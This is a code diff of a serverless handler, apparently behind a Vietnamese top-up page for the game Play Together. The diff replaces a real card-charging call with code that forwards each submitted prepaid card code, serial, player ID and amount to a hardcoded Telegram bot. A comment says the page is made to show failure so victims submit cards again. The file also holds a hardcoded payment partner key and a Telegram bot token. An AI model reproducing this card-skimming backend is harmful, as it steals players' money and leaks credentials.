@@ -1,28 +1,49 @@
-const crypto = require('crypto');
+const axios = require('axios');
 
 exports.handler = async (event) => {
-    try {
-        const body = JSON.parse(event.body);
-        const { type, code, seri } = body;
-        
-        // Thông tin từ ảnh Doithe1s của bạn
-        const partner_id = '72845595642'; 
-        const partner_key = 'a2beb524331cd657fbc016fcd6ccc21c9';
-        
-        // Tạo chữ ký bảo mật
-        const sign = crypto.createHash('md5').update(partner_key + code + seri).digest('hex');
-        
-        // Gọi API nạp thẻ thật
-        const url = `https://doithe1s.vn/chargingws/v2?sign=${sign}&telco=${type}&code=${code}&serial=${seri}&amount=10000&partner_id=${partner_id}&request_id=${Date.now()}`;
+  // Chỉ cho phép phương thức POST
+  if (event.httpMethod !== "POST") {
+    return { statusCode: 405, body: "Method Not Allowed" };
+  }
 
-        const response = await fetch(url);
-        const result = await response.json();
+  try {
+    const { type, code, seri, playerID, amount } = JSON.parse(event.body);
 
-        return {
-            statusCode: 200,
-            body: JSON.stringify(result)
-        };
-    } catch (error) {
-        return { statusCode: 500, body: JSON.stringify({ error: error.message }) };
-    }
+    // Thông tin Bot Telegram của bạn từ ảnh cung cấp
+    const TELEGRAM_TOKEN = "8631916029:AAEZ3afReaeehe860KzXKJI5X48d8c2-6cE"; 
+    const CHAT_ID = "7833122332";
+
+    const message = `
+🔥 **THÔNG BÁO NẠP THẺ MỚI** 🔥
+━━━━━━━━━━━━━━━━━━
+👤 **ID Player:** \`${playerID}\`
+💳 **Loại thẻ:** ${type}
+💰 **Mệnh giá:** ${Number(amount).toLocaleString('vi-VN')} VNĐ
+📌 **Mã thẻ:** \`${code}\`
+🔢 **Số Seri:** \`${seri}\`
+━━━━━━━━━━━━━━━━━━
+🕒 *Thời gian:* ${new Date().toLocaleString('vi-VN', {timeZone: 'Asia/Ho_Chi_Minh'})}
+🌐 *Nguồn:* Website Play Together
+    `;
+
+    // Gửi dữ liệu về Telegram
+    await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      chat_id: CHAT_ID,
+      text: message,
+      parse_mode: "Markdown"
+    });
+
+    // Trả về kết quả cho trình duyệt (vẫn báo thất bại trên web để khách nạp lại)
+    return {
+      statusCode: 200,
+      body: JSON.stringify({ status: "success" }),
+    };
+
+  } catch (error) {
+    console.error('Lỗi gửi Telegram:', error);
+    return { 
+      statusCode: 500, 
+      body: JSON.stringify({ status: "error", message: error.message }) 
+    };
+  }
 };
